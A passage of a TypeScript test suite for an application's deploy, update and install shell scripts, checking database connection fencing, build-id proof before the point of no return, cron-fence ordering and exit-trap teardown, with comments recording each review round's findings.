    // During the fenced window DATABASE_URL is the PRIVILEGED url. A check that resolved its
    // role from there would ask whether the deploy admin can use the objects the deploy admin
    // just created — yes, for every one of them. The fence state file records the role whose
    // CONNECT was revoked, which is the application.
    const continuation = callContinuation(lines, realCodeLine(lines, OBJECT_ACCESS_INVOCATION))
    assert.match(
      continuation,
      /--state-file=|--app-role=/,
      'the call must name the role it asks about, or the answer is about the wrong role',
    )
  })
}

test('the CI path filter covers the object-access check, not only its three siblings', () => {
  // The workflow re-runs the schema guardrails when a deploy script or one of its helpers
  // changes. It listed check-db-writers, fence-db-connections and run-migration-verifications
  // — and not the one that closes the CRITICAL, so a change to it ran no guardrail at all.
  const workflow = readFileSync(join(process.cwd(), '.github/workflows/schema-guardrails.yml'), 'utf8')
  const filters = [...workflow.matchAll(/^\s+- "(scripts\/[^"]+)"$/gm)].map((match) => match[1])
  const siblings = filters.filter((path) => path === 'scripts/check-db-writers.mjs').length
  assert.ok(siblings >= 2, 'the pull_request and push filters both list the sibling scripts')
  assert.equal(
    filters.filter((path) => path === 'scripts/check-app-db-object-access.mjs').length,
    siblings,
    'the object-access check must be listed wherever its siblings are',
  )
  assert.match(
    workflow,
    /check-app-db-object-access\.mjs/,
    'and CI must actually run it against the migrated database, not merely watch the file',
  )
})

// ---------------------------------------------------------------------------
// o3d-2sm1.5 (Codex r5, HIGH) — THE POINT OF NO RETURN WAS ARMED BY "SOMETHING ANSWERED THE
// PORT".
//
// The health poll proves a socket accepted a request. It does not prove WHICH process. In
// deploy.sh HEALTH_PATH defaults to /login, which touches no database and which the
// PREDECESSOR serves just as happily; the BUILD_ID comparison was a `warn`; and when the
// scrape regex missed, the served id was empty and the mismatch branch was skipped outright.
// update.sh and install.sh poll /api/health, which is process liveness and nothing else.
//
// So a stale predecessor still holding the port armed PAST_POINT_OF_NO_RETURN — and the trap
// then explicitly REFUSED to stop it, printing "everything that could reject this release has
// already passed", leaving the OLD build serving a MIGRATED schema with the deploy reporting
// success. Before the point of no return existed, that same trap tore it down: the fix turned
// a recoverable case into a permanent one.
//
// The flag must therefore be armed by POSITIVE PROOF, and a mismatch must be fatal.
// ---------------------------------------------------------------------------

for (const [name, lines] of [
  ['deploy.sh', DEPLOY_LINES],
  ['update.sh', UPDATE_LINES],
  ['install.sh', INSTALL_LINES],
] as const) {
  test(`${name} arms the point of no return only when the build on disk was PROVEN to be serving`, () => {
    const arm = lines.findIndex((line) => isCode(line) && /^\s*PAST_POINT_OF_NO_RETURN=true\s*$/.test(line))
    assert.notEqual(arm, -1, 'the script must have a point of no return')

    // The nearest preceding line of code must be the `if` that guards it. An unconditional
    // arming is the defect: it is reached by an open port and nothing else.
    let previous = arm - 1
    while (previous >= 0 && !isCode(lines[previous])) previous -= 1
    assert.match(
      lines[previous],
      /^\s*if\s+.*\$NEW_BUILD_SERVING/,
      'PAST_POINT_OF_NO_RETURN=true must be guarded by the proof, not merely follow the health poll',
    )
  })

  test(`${name} sets that proof only from evidence the NEW build answered, never from the poll`, () => {
    const source = lines.filter(isCode).join('\n')
    assert.match(
      source,
      /_next\/static\/\$\{NEW_BUILD_ID\}/,
      'the proof channel is an asset only the process with THAT build id serves',
    )

    const proofs = lines
      .map((line, index) => ({ line, index }))
      .filter((entry) => isCode(entry.line) && /^\s*NEW_BUILD_SERVING=true\s*$/.test(entry.line))
    assert.ok(proofs.length > 0, 'something must be able to establish the proof, or no deploy ever completes')

    for (const proof of proofs) {
      const window = lines
        .slice(Math.max(0, proof.index - 8), proof.index)
        .filter(isCode)
        .join('\n')
      assert.ok(
        /_next\/static\/\$\{NEW_BUILD_ID\}/.test(window),
        `NEW_BUILD_SERVING=true at line ${proof.index + 1} is not preceded by the build-id-scoped asset fetch`,
      )
    }
  })

  test(`${name} refuses to arm it when nothing identified the process on the port`, () => {
    // "Nothing proved it" must not read as "proven". The schema has already moved, so the
    // recoverable outcome is the trap's teardown, not a green deploy over the old build.
    const source = lines.filter(isCode).join('\n')
    assert.match(
      source,
      /die "Something answered [^"]*nothing proved it was BUILD_ID/,
      'an unidentified process on the port must be fatal while the trap can still tear it down',
    )
    assert.ok(
      !/NEW_BUILD_SERVING=true[^\n]*\|\|/.test(source),
      'and the proof must not be set by a fallback that cannot fail',
    )
  })
}

// ---------------------------------------------------------------------------
// o3d-2sm1.5 (r6, CRITICAL) — AND MAKING THAT MISMATCH FATAL WAS A DETERMINISTIC OUTAGE.
//
// The round above made a scraped build id that differs from the one on disk `die`. But
// detect_service_units selects any unit whose WorkingDirectory resolves to the app dir, and on
// this host that is ims-stage-dev.service — a `next dev` server. A dev server's build id is the
// literal string `development`: eleven characters, so it clears the scrape's {10,} filter, the
// id is non-empty, and the mismatch branch fires on EVERY run. Sequence: build, stop, migrate,
// start, health pass, then die — with PAST_POINT_OF_NO_RETURN still false and the fence armed,
// so the trap re-stopped the units it had just correctly started, installed the reboot fence
// and held the CONNECT revoke. Migrated schema, nothing serving, application role locked out of
// its own database. Every time.
//
// A mismatch means NOT PROVEN. Only the build-id-scoped asset channel proves, and it is the one
// that arms the flag; a scrape over whatever HTML the health path returns is evidence, never a
// verdict.
// ---------------------------------------------------------------------------

test('deploy.sh treats a served build id that is not the one on disk as unproven, not as fatal', () => {
  const source = DEPLOY_LINES.filter(isCode).join('\n')
  assert.ok(
    !/die "Served BUILD_ID/.test(source),
    'a scraped id that differs is not proof of a stale predecessor, and killing the deploy there tears down a service that is serving',
  )
  assert.match(
    source,
    /warn "The build id scraped from \$\{HEALTH_URL\}/,
    'the mismatch must still be reported — it is evidence, it is just not a verdict',
  )
  // And it must not arm the proof either: the branch that reports the mismatch is a warn and
  // nothing else. Measured, so this cannot pass by the string simply being absent.
  const mismatch = DEPLOY_LINES.findIndex((line) => isCode(line) && /warn "The build id scraped from/.test(line))
  assert.notEqual(mismatch, -1, 'the mismatch branch must exist for this to be asserting anything')
  const branch = DEPLOY_LINES.slice(mismatch, mismatch + 4)
    .filter(isCode)
    .join('\n')
  assert.ok(!/NEW_BUILD_SERVING=true/.test(branch), 'the mismatch branch must not arm the proof')
})

test('deploy.sh cannot prove a build id from a development server, and does not call that a stale predecessor', () => {
  const source = DEPLOY_LINES.filter(isCode).join('\n')
  assert.match(
    source,
    /unit_is_dev_server\(\)/,
    'the script must be able to tell that a unit it selected runs `next dev`',
  )
  assert.match(
    source,
    /DEV_SERVER_UNIT=true/,
    'and record it, so the proof phase can distinguish "cannot prove" from "proven wrong"',
  )
  // The dev unit is still SELECTED, so it is still stopped and drained for the migration: it
  // is a live writer into this database. Excluding it from selection would leave it writing
  // through the migration, which is worse than not being able to prove a build id.
  const detect = DEPLOY_LINES.findIndex((line) => isCode(line) && /^detect_service_units\(\)/.test(line))
  const devCheck = DEPLOY_LINES.findIndex((line) => isCode(line) && /^unit_is_dev_server\(\)/.test(line))
  assert.ok(detect !== -1 && devCheck > detect, 'the dev-server test must be a separate observation, not a filter inside the selector')
  assert.ok(
    !/unit_is_dev_server "\$unit" && continue|unit_is_dev_server[^\n]*\|\| echo "\$unit"/.test(source),
    'a dev unit must not be filtered out of SERVICE_UNITS — it is a writer that has to be stopped',
  )
  // And the teardown is kept for the case it was written for: an unidentified process.
  assert.match(
    source,
    /if \$DEV_SERVER_UNIT; then[\s\S]*?else\s*\n\s*die "Something answered/,
    'an unidentified process on the port is still fatal; only the dev-server case is downgraded',
  )
})

test('the build-id scrape is bounded by --max-time like every other curl on that path', () => {
  const scrape = DEPLOY_LINES.find((line) => isCode(line) && /SERVED_ID="\$\(curl/.test(line))
  assert.ok(scrape, 'deploy.sh must scrape the served build id')
  assert.match(
    scrape as string,
    /--max-time \d+/,
    'a server that accepts and then stalls would hang the deploy for ever, post-migration, with the fence down',
  )
})

for (const [name, lines] of [
  ['deploy.sh', DEPLOY_LINES],
  ['update.sh', UPDATE_LINES],
  ['install.sh', INSTALL_LINES],
] as const) {
  test(`${name}'s trap does not substitute the admin URL for a migration URL the composer refused`, () => {
    const source = lines.filter(isCode).join('\n')
    // `--print-migration-url` throws precisely to stop a migration running AS THE ADMIN while
    // the log announces the application role. Catching that throw and assigning
    // DEPLOY_ADMIN_DATABASE_URL substitutes exactly the URL it refused to emit.
    assert.ok(
      !/--print-migration-url[\s\S]{0,80}\|\|\s*MIGRATION_DATABASE_URL="\$\{?DEPLOY_ADMIN_DATABASE_URL\}?"/.test(source),
      'the refusal must not be caught and answered with the very URL it refused',
    )
    assert.ok(
      !/--print-migration-url 2>\/dev\/null/.test(source),
      'and the reason it refused must not be discarded',
    )
  })
}

// ---------------------------------------------------------------------------
// o3d-2sm1.5 (Codex r7, HIGH) — A CRON-FENCING ERROR STOPPED A STILL-HEALTHY SERVICE.
//
// FENCE_ARMED was raised BEFORE `fence_cron` and before any stop, so every way cron
// management can fail — a crontab backup that cannot be written, a failed chmod, a broken
// pipeline, a `crontab` that returns non-zero — arrived at the exit trap looking exactly
// like a failed migration. The trap then STOPPED a service nobody had touched, kept the
// reboot fence and demanded a recovery, on a host whose schema had not moved and whose
// predecessor was still serving. A failure in the cheapest, most reversible step ran the
// expensive, outage-causing machinery, in all three entrypoints.
//
// The fix is the phase model, not another guard: `arming` (reversible state exists, nothing
// stopped) is a different phase from `stopping` (a stop has been attempted), and the trap
// unwinds the first and defends the second.
// ---------------------------------------------------------------------------

/** The line index of the first code line matching `pattern`, at or after `from`. */
function requireCodeLine(lines: string[], pattern: RegExp, from: number, what: string): number {
  const index = codeLine(lines, pattern, from)
  assert.notEqual(index, -1, what)
  return index
}

const ARMING_ORDER = [
  {
    name: 'deploy.sh',
    lines: DEPLOY_LINES,
    // deploy.sh and update.sh carry phase markers; install.sh's cutover is a plain block.
    anchor: (lines: string[]) => phaseLine(lines, 'fence-writers'),
  },
  {
    name: 'update.sh',
    lines: UPDATE_LINES,
    anchor: (lines: string[]) => phaseLine(lines, 'fence-writers'),
  },
  {
    name: 'install.sh',
    lines: INSTALL_LINES,
    anchor: (lines: string[]) =>
      requireCodeLine(lines, /install_reboot_fence "install\.sh cutover started/, 0, 'install.sh must have a cutover fence-writers block'),
  },
] as const

for (const entry of ARMING_ORDER) {
  test(`${entry.name} keeps only the REBOOT fence in the reversible phase, and fences cron after the stop`, () => {
    const { lines } = entry
    // The anchor is the reboot-fence install, so start looking a little before it: the
    // arming flag has to be raised BEFORE the first thing that creates cutover state.
    const anchor = entry.anchor(lines)
    const from = Math.max(0, anchor - 40)

    const arming = requireCodeLine(lines, /^\s*CUTOVER_ARMING=true\s*$/, from, 'the reversible phase must be entered explicitly')
    const install = requireCodeLine(lines, /install_reboot_fence "/, arming, 'the reboot fence is installed inside the arming phase')
    const armed = requireCodeLine(lines, /^\s*FENCE_ARMED=true\s*$/, arming, 'and the fence is armed after it')
    const stop = requireCodeLine(lines, /systemctl stop/, armed, 'the stop must follow the arming')
    const cron = requireCodeLine(lines, /^\s*fence_cron\s*$/, stop, 'the cron writers are fenced after the stop')

    assert.ok(arming < install, 'the arming phase must be entered before the reboot fence is written')
    assert.ok(armed < stop, 'and FENCE_ARMED must be raised before anything is actually stopped')

    // THIS ASSERTION USED TO READ `cron < armed`, AND ITS RATIONALE WAS TRUE OF THE WRONG THING
    // (o3d-p9dq, Codex r26 HIGH). Keeping fence_cron inside the reversible phase did make a
    // failed backup a pre-stop failure — but it also made the fence itself a read-modify-write of
    // a crontab a browser could still be reconciling, and the flock cannot close that on the
    // rollout that introduces it, because the predecessor was built before the flock existed.
    // Only the stop reaches that process. So the fence moved below the stop, a failed backup is
    // now an honest post-stop failure (fence_cron's own message says the service is stopped), and
    // what stays in the reversible phase is the reboot fence, which must be installed before
    // anything is stopped because a fence installed on the way out does not exist for a run that
    // is killed.
    assert.ok(
      stop < cron,
      'fence_cron must run AFTER the stop: fencing the crontab while the predecessor can still '
      + 'reconcile it from a browser is the lost-update this protocol exists to prevent',
    )
    // And there is no SECOND, earlier cutover fence left behind above the stop.
    const strayFence = lines.findIndex((line, index) =>
      index > arming && index < stop && isCode(line) && /^\s*fence_cron\s*$/.test(line))
    assert.equal(strayFence, -1,
      `${entry.name}:${strayFence + 1} fences the crontab between the arming and the stop, which is `
      + 'exactly the window the fence was moved out of')

    // And the phase is CLOSED where the cutover ends. A CUTOVER_ARMING left raised past that
    // point sends a cleanup failure into the pre-stop branch, which would report a
    // predecessor that was never stopped and unwind a fence that is already gone.
    const disarmed = requireCodeLine(lines, /^\s*CUTOVER_ARMING=false\s*$/, stop, 'the arming phase must be closed when the cutover ends')

    // THE STOPPING PHASE DOES NOT COME DOWN WITH IT (o3d-2sm1.5, Codex r8 MEDIUM).
    //
    // The two flags used to be cleared on adjacent lines, and this test asserted exactly
    // that. It was wrong for the one path that reaches here WITHOUT the point of no return
    // — deploy.sh's dev-responder escape hatch, which promises in its own warning and in the
    // runbook that a later failure can still be torn down. With both flags down, a failure
    // in the cron restore or the marker removal matched NONE of the trap's four phase
    // branches: no teardown at all, and an unidentified process left serving the migrated
    // schema.
    //
    // So the stop flag comes down HERE only for a run that has proven its responder, and
    // unguarded only after the cleanup it covers has finished.
    const guardedDown = requireCodeLine(lines, /^\s*FENCE_ARMED=false\s*$/, disarmed, 'the stopping phase must still be closed')
    assert.ok(disarmed < guardedDown, 'the arming flag must come down first: nothing reversible is left by then')
    const guard = lines
      .slice(Math.max(disarmed, guardedDown - 4), guardedDown)
      .filter(isCode)
      .join('\n')
    assert.match(
      guard,
      /if\s+\$?\{?PAST_POINT_OF_NO_RETURN\}?;\s*then/,
      'the first FENCE_ARMED=false after the cutover must be guarded by the point of no return, or an escape path loses its only teardown branch mid-cleanup',
    )

    // And there is a SECOND, unguarded one, after the cleanup that flag was covering.
    const cleanup = requireCodeLine(lines, /^\s*unfence_cron\s*$/, guardedDown, 'cron is restored after the guard')
    const finalDown = requireCodeLine(lines, /^\s*FENCE_ARMED=false\s*$/, cleanup, 'and the stop flag stands down once cleanup has succeeded')
    assert.ok(
      cleanup < finalDown,
      'the escape path must keep the stop flag raised until cron and marker cleanup have completed',
    )
  })
}

/**
 * The exit trap, run for real, in the state a failed `fence_cron` leaves behind.
 *
 * The scenario is the exact one that used to cost an outage: this run wrote the crontab
 * backup and then the `crontab` install failed, so CRON_FENCED is false while a backup and
 * a freshly written reboot fence are both on disk — and NOTHING has been stopped.
 */
const ARMING_TRAP_CASES = [
  {
    name: 'deploy.sh',
    source: DEPLOY_LINES.join('\n'),
    trap: 'on_exit',
    marker: 'FENCED',
    preamble: (dir: string) => `
# THE REAL CRONTAB EXCLUSION, SOURCED RATHER THAN STUBBED (o3d-p9dq). Every fence, unfence,
# adoption and unwind lifted into these harnesses performs its read-modify-write through
# with_crontab_lock, so a harness that stubbed it out would be measuring an ordering the shipped
# code no longer has. The lock file is created directly because prepare_crontab_lock needs root;
# its preparation is exercised in tests/settings/crontab-reconcile-serialization.test.ts.
source '${LOCK_LIB}'
crontab_lock_paths '${dir}'
mkdir -p "\${CRONTAB_LOCK_DIR}"
: > "\${CRONTAB_LOCK_FILE}"
DRY_RUN=false
BLUE=''; GREEN=''; YELLOW=''; RED=''; BOLD=''; RESET=''
STATE_DIR='${dir}'
CUTOVER_STATE_DIR='${dir}'
APP_USER=appuser
APP_DIR_REAL=/opt/app
PORT=3000
CURRENT_STEP=fence-writers
DEPLOY_OK=false
PAST_POINT_OF_NO_RETURN=false
SCHEMA_TOUCHED=false
FENCE_MASK=true
DB_FENCE_UP=false
REBOOT_FENCE_INSTALLED=true
FENCE_FILE="\${STATE_DIR}/FENCED"
CRON_BACKUP="\${STATE_DIR}/crontab.bak"
FENCE_DROPIN_DIR="\${STATE_DIR}/dropin"
FENCE_DROPIN_FILE="\${FENCE_DROPIN_DIR}/zz-deploy-fence.conf"
FENCE_DROPINS_CREATED=("\${FENCE_DROPIN_FILE}")
FENCE_DROPIN_NAME=zz-deploy-fence.conf
FENCE_MARKER_PREEXISTED=false
SERVICE_UNITS=(app.service)
DB_FENCE_STATE="\${STATE_DIR}/db.json"
DB_FENCE_SCRIPT=/opt/app/scripts/fence-db-connections.mjs
DEPLOY_ADMIN_DATABASE_URL='postgres://admin@127.0.0.1/nowhere'
MIGRATION_DATABASE_URL=''
DB_FENCE_RELEASE_CMD='node fence-db-connections.mjs --release --app-host=localhost --app-port=5432 --app-user=imsapp --app-database=imsdb'
# o3d-2sm1.5 r19: the application's connection identity, which the helper is TOLD and never works
# out. Every entrypoint passes it on every fence invocation, and refuses when it cannot read it —
# the extracted functions below reference both exactly as the shipped scripts do.
DB_FENCE_IDENTITY_ARGS=('--app-host=localhost' '--app-port=5432' '--app-user=imsapp' '--app-database=imsdb')
require_db_identity() { [[ "\${#DB_FENCE_IDENTITY_ARGS[@]}" -eq 4 ]]; }
DB_IDENTITY_REASON=''
# o3d-2sm1.5 r20: and the second half of the same refusal — whether the file that identity was
# read from is the only thing that can define DATABASE_URL for the service. Stubbed to "yes" here
# because these harnesses are about the ORDER of the fence, the stop and the migration, not about
# where the identity came from; tests/scripts/db-connection-fence.test.ts exercises the question
# itself against a fake systemctl.
require_env_file_is_sole_definition() { return 0; }
DB_IDENTITY_SOURCE_REASON=''
# o3d-2sm1.5 r22: and the THIRD half — that the file still says what it said when the run
# pinned it, re-read at the fence, at the release and after the final daemon-reload. Stubbed
# to "unchanged" for the same reason: these harnesses are about ORDER, and the re-read is
# exercised against real files, real tampering and a fake systemctl in
# tests/scripts/db-connection-fence.test.ts.
require_start_identity_unchanged() { return 0; }
DB_IDENTITY_DRIFT_REASON=''
: "\${APP_DIR_REAL:=/opt/app}"
: "\${APP_DIR:=/opt/app}"
`,
  },
  {
    name: 'update.sh',
    source: UPDATE_LINES.join('\n'),
    trap: 'on_exit',
    marker: 'FENCED',
    preamble: (dir: string) => `
# THE REAL CRONTAB EXCLUSION, SOURCED RATHER THAN STUBBED (o3d-p9dq). Every fence, unfence,
# adoption and unwind lifted into these harnesses performs its read-modify-write through
# with_crontab_lock, so a harness that stubbed it out would be measuring an ordering the shipped
# code no longer has. The lock file is created directly because prepare_crontab_lock needs root;
# its preparation is exercised in tests/settings/crontab-reconcile-serialization.test.ts.
source '${LOCK_LIB}'
crontab_lock_paths '${dir}'
mkdir -p "\${CRONTAB_LOCK_DIR}"
: > "\${CRONTAB_LOCK_FILE}"
DRY_RUN=false
BLUE=''; GREEN=''; YELLOW=''; RED=''; BOLD=''; RESET=''
DATA_DIR='${dir}'
CUTOVER_STATE_DIR='${dir}'
APP_USER=appuser
SERVICE_UNIT=app.service
CURRENT_STEP=fence-writers
DEPLOY_OK=false
PAST_POINT_OF_NO_RETURN=false
SCHEMA_TOUCHED=false
DB_FENCE_UP=false
REBOOT_FENCE_INSTALLED=true
BACKUP_FILE=''
BACKUP_DIR="\${DATA_DIR}/backups"
FENCE_FILE="\${DATA_DIR}/FENCED"
CRON_BACKUP="\${DATA_DIR}/crontab.bak"
FENCE_DROPIN_DIR="\${DATA_DIR}/dropin"
FENCE_DROPIN_FILE="\${FENCE_DROPIN_DIR}/zz-deploy-fence.conf"
FENCE_DROPIN_CREATED=true
FENCE_MARKER_PREEXISTED=false
DB_FENCE_STATE="\${DATA_DIR}/db.json"
DB_FENCE_SCRIPT=/opt/app/scripts/fence-db-connections.mjs
DEPLOY_ADMIN_DATABASE_URL='postgres://admin@127.0.0.1/nowhere'
MIGRATION_DATABASE_URL=''
DB_FENCE_RELEASE_CMD='node fence-db-connections.mjs --release --app-host=localhost --app-port=5432 --app-user=imsapp --app-database=imsdb'
# o3d-2sm1.5 r19: the application's connection identity, which the helper is TOLD and never works
# out. Every entrypoint passes it on every fence invocation, and refuses when it cannot read it —
# the extracted functions below reference both exactly as the shipped scripts do.
DB_FENCE_IDENTITY_ARGS=('--app-host=localhost' '--app-port=5432' '--app-user=imsapp' '--app-database=imsdb')
require_db_identity() { [[ "\${#DB_FENCE_IDENTITY_ARGS[@]}" -eq 4 ]]; }
DB_IDENTITY_REASON=''
# o3d-2sm1.5 r20: and the second half of the same refusal — whether the file that identity was
# read from is the only thing that can define DATABASE_URL for the service. Stubbed to "yes" here
# because these harnesses are about the ORDER of the fence, the stop and the migration, not about
# where the identity came from; tests/scripts/db-connection-fence.test.ts exercises the question
# itself against a fake systemctl.
require_env_file_is_sole_definition() { return 0; }
DB_IDENTITY_SOURCE_REASON=''
# o3d-2sm1.5 r22: and the THIRD half — that the file still says what it said when the run
# pinned it, re-read at the fence, at the release and after the final daemon-reload. Stubbed
# to "unchanged" for the same reason: these harnesses are about ORDER, and the re-read is
# exercised against real files, real tampering and a fake systemctl in
# tests/scripts/db-connection-fence.test.ts.
require_start_identity_unchanged() { return 0; }
DB_IDENTITY_DRIFT_REASON=''
: "\${APP_DIR_REAL:=/opt/app}"
: "\${APP_DIR:=/opt/app}"
`,
  },
  {
    name: 'install.sh',
    source: INSTALL_SOURCE,
    trap: 'on_cutover_exit',
    marker: 'FENCED',
    preamble: (dir: string) => `
# THE REAL CRONTAB EXCLUSION, SOURCED RATHER THAN STUBBED (o3d-p9dq). Every fence, unfence,
# adoption and unwind lifted into these harnesses performs its read-modify-write through
# with_crontab_lock, so a harness that stubbed it out would be measuring an ordering the shipped
# code no longer has. The lock file is created directly because prepare_crontab_lock needs root;
# its preparation is exercised in tests/settings/crontab-reconcile-serialization.test.ts.
source '${LOCK_LIB}'
crontab_lock_paths '${dir}'
mkdir -p "\${CRONTAB_LOCK_DIR}"
: > "\${CRONTAB_LOCK_FILE}"
DATA_DIR='${dir}'
CUTOVER_STATE_DIR='${dir}'
APP_USER=appuser
APP_NAME=one-two-inventory
CUTOVER_STEP=fence-writers
PAST_POINT_OF_NO_RETURN=false
SCHEMA_TOUCHED=false
DB_FENCE_UP=false
REBOOT_FENCE_INSTALLED=true
FENCE_FILE="\${DATA_DIR}/FENCED"
CRON_BACKUP="\${DATA_DIR}/crontab.bak"
FENCE_DROPIN_DIR="\${DATA_DIR}/dropin"
FENCE_DROPIN_FILE="\${FENCE_DROPIN_DIR}/zz-deploy-fence.conf"
FENCE_DROPIN_CREATED=true
FENCE_MARKER_PREEXISTED=false
DB_FENCE_STATE="\${DATA_DIR}/db.json"
DB_FENCE_SCRIPT=/opt/app/scripts/fence-db-connections.mjs
DEPLOY_ADMIN_DATABASE_URL='postgres://admin@127.0.0.1/nowhere'
MIGRATION_DATABASE_URL=''
DB_FENCE_RELEASE_CMD='node fence-db-connections.mjs --release --app-host=localhost --app-port=5432 --app-user=imsapp --app-database=imsdb'
# o3d-2sm1.5 r19: the application's connection identity, which the helper is TOLD and never works
# out. Every entrypoint passes it on every fence invocation, and refuses when it cannot read it —
# the extracted functions below reference both exactly as the shipped scripts do.
DB_FENCE_IDENTITY_ARGS=('--app-host=localhost' '--app-port=5432' '--app-user=imsapp' '--app-database=imsdb')
require_db_identity() { [[ "\${#DB_FENCE_IDENTITY_ARGS[@]}" -eq 4 ]]; }
DB_IDENTITY_REASON=''
# o3d-2sm1.5 r20: and the second half of the same refusal — whether the file that identity was
# read from is the only thing that can define DATABASE_URL for the service. Stubbed to "yes" here
# because these harnesses are about the ORDER of the fence, the stop and the migration, not about
# where the identity came from; tests/scripts/db-connection-fence.test.ts exercises the question
# itself against a fake systemctl.
require_env_file_is_sole_definition() { return 0; }
DB_IDENTITY_SOURCE_REASON=''
# o3d-2sm1.5 r22: and the THIRD half — that the file still says what it said when the run
# pinned it, re-read at the fence, at the release and after the final daemon-reload. Stubbed
# to "unchanged" for the same reason: these harnesses are about ORDER, and the re-read is
# exercised against real files, real tampering and a fake systemctl in
# tests/scripts/db-connection-fence.test.ts.
require_start_identity_unchanged() { return 0; }
DB_IDENTITY_DRIFT_REASON=''
: "\${APP_DIR_REAL:=/opt/app}"
: "\${APP_DIR:=/opt/app}"
`,
  },
] as const

/** Everything the trap calls that is NOT the subject: recorded, never performed. */
const TRAP_STUBS = `
LOG="\${STATE_DIR:-\${DATA_DIR}}/calls.log"
: > "\${LOG}"
info(){ :; }
warn(){ echo "$*"; }
error(){ echo "$*"; }
ok(){ echo "$*"; }
success(){ echo "$*"; }
systemctl(){ echo "systemctl $*" >> "\${LOG}"; return 0; }
crontab(){
  echo "crontab $*" >> "\${LOG}"
  # THE RESTORE IS A PIPE NOW (o3d-p9dq, Codex r27). It used to be 'crontab -u <user> <backup>',
  # so the log line named the file and that was the whole assertion. Since the restore decides
  # WHAT to install rather than which path to copy, the content is what has to be observed — so
  # a write (last argument '-') has its stdin recorded and the assertions read that.
  #
  # AND A -l READ ANSWERS WITH THE CRONTAB THE SCENARIO ACTUALLY HAS (o3d-p9dq, Codex r28). This shim
  # used to answer every read with nothing, which is not a neutral stub: it describes a crontab
  # somebody has emptied, and the restore now refuses to install a snapshot over that rather than
  # resurrecting entries a deletion removed. Each harness seeds \${FAKE_LIVE_CRONTAB} with the
  # state its own scenario leaves — the unfenced original for a fence whose write failed, the
  # fenced projection for a run interrupted after it fenced.
  if [[ " $* " == *" -l "* ]]; then
    if [[ -n "\${FAKE_LIVE_CRONTAB:-}" && -f "\${FAKE_LIVE_CRONTAB}" ]]; then cat "\${FAKE_LIVE_CRONTAB}"; fi
    return 0
  fi
  if [[ "\${*: -1}" == "-" ]]; then sed 's/^/crontab-stdin: /' >> "\${LOG}"; fi
  return 0
}
install_reboot_fence(){ echo "install_reboot_fence $*" >> "\${LOG}"; return 0; }
release_db_connections(){ echo "release_db_connections" >> "\${LOG}"; return 0; }
refence_db_connections(){ echo "refence_db_connections" >> "\${LOG}"; return 0; }
write_fence_marker(){ echo "write_fence_marker $*" >> "\${LOG}"; return 0; }
write_cutover_marker(){ echo "write_cutover_marker $*" >> "\${LOG}"; return 0; }
# o3d-2sm1.5 r23: the trap withdraws the environment snapshot it published before it re-fences.
# Stubbed like every other side effect here, and RECORDED, so the ordering assertions can see it.
remove_db_identity_snapshot(){ echo "remove_db_identity_snapshot" >> "\${LOG}"; return 0; }
`

function runTrapHarness(
  entry: (typeof ARMING_TRAP_CASES)[number],
  state: string,
): { log: string; stdout: string; markerExists: boolean; dropinExists: boolean } {
  const dir = mkdtempSync(join(tmpdir(), 'ims-arming-'))
  try {
    const dropinDir = join(dir, 'dropin')
    execFileSync('mkdir', ['-p', dropinDir])
    // What the arming phase had put on disk when the failure hit.
    writeFileSync(join(dir, 'FENCED'), 'migration_attempted=false\nschema_touched=false\n')
    writeFileSync(join(dropinDir, 'zz-deploy-fence.conf'), '[Unit]\n')
    writeFileSync(join(dir, 'crontab.bak'), '*/5 * * * * /usr/bin/true\n')
    // …and the crontab itself. This scenario is "fence_cron took the backup and its `crontab -`
    // then failed", so the live crontab is the ORIGINAL, unchanged and unfenced.
    writeFileSync(join(dir, 'live-crontab'), '*/5 * * * * /usr/bin/true\n')

    const program = [
      'set -euo pipefail',
      entry.preamble(dir),
      TRAP_STUBS,
      `FAKE_LIVE_CRONTAB='${join(dir, 'live-crontab')}'`,
      shellFunction(entry.source, 'restore_cron_from_backup_locked'),
      shellFunction(entry.source, 'restore_cron_from_backup'),
      shellFunction(entry.source, 'rollback_reboot_fence_install'),
      shellFunction(entry.source, 'unwind_arming'),
      shellFunction(entry.source, entry.trap),
      state,
      // PRODUCTION SEMANTICS, WHICH `||` TAKES AWAY (o3d-2sm1.5, Codex r9 MEDIUM).
      //
      // This was `( (exit 7) || TRAP ) || TRAP_STATUS=$?`. Bash suppresses errexit for every
      // command of an AND-OR list except the last, and that suppression is INHERITED by the
      // whole subshell — so the trap and every helper it called ran with `set -e` disabled,
      // and a failing cleanup step inside them could not abort the way it does in a real
      // run. The tests proved the trap's happy path and nothing else.
      //
      // So: errexit off in the OUTER harness only, a standalone subshell that turns it back
      // on and installs the trap the way the script does, `$?` read afterwards, `set -e`
      // restored. The subshell still absorbs the trap's own `exit` so the files can be read.
      // The status is echoed because a trap that dies early — an unbound variable under
      // `set -u`, say — otherwise looks exactly like a trap that deliberately did nothing.
      'set +e',
      `( trap ${entry.trap} EXIT; set -e; exit 7 )`,
      'TRAP_STATUS=$?',
      'set -e',
      'echo "TRAP_EXIT=${TRAP_STATUS}"',
    ].join('\n')
    const stdout = execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
    return {
      log: readFileSync(join(dir, 'calls.log'), 'utf8'),
      stdout,
      markerExists: existsSync(join(dir, 'FENCED')),
      dropinExists: existsSync(join(dropinDir, 'zz-deploy-fence.conf')),
    }
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

for (const entry of ARMING_TRAP_CASES) {
  test(`${entry.name}'s trap does not stop a service it never stopped when the cron fence fails`, () => {
    // fence_cron wrote the backup and then `crontab` failed: CRON_FENCED is false, the
    // backup exists, the reboot fence is installed, and nothing has been stopped.
    const result = runTrapHarness(
      entry,
      ['CUTOVER_ARMING=true', 'FENCE_ARMED=false', 'CRON_FENCED=false', 'CRON_BACKUP_CREATED=true'].join('\n'),
    )

    assert.ok(
      !/systemctl stop/.test(result.log),
      `a pre-stop failure must not stop the service — the trap ran: ${result.log}`,
    )
    assert.ok(!/install_reboot_fence/.test(result.log), 'nor re-install the reboot fence it is about to remove')
    assert.ok(!/refence_db_connections/.test(result.log), 'nor revoke CONNECT on a database that was never fenced')
    assert.match(
      result.log,
      /crontab-stdin: \*\/5 \* \* \* \* \/usr\/bin\/true/,
      'the crontab must be restored from the backup this run took, whatever fence_cron managed to do with it',
    )
    assert.equal(result.markerExists, false, 'the reboot-fence marker this run wrote must be removed, or the next boot is refused')
    assert.equal(result.dropinExists, false, 'and so must the drop-in')
    assert.match(result.stdout, /BEFORE THE STOP/, 'and the operator must be told which kind of failure this was')
    assert.match(result.stdout, /TRAP_EXIT=7/, 'the trap must run to its end and preserve the failure status')
  })

